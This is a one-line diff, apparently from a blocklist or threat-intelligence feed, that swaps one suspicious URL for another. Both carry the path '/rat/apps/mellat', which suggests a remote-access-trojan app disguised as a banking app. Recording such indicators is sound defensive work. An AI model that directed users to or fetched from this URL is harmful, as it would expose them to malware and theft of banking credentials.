@@ -1,1 +1,1 @@
-junesfssinfusefehfesufhnbseuyhgfsefbsyfsegfsehyfvsefgs.click/rat/apps/mellat
+1apppro.buzz/rat/apps/mellat
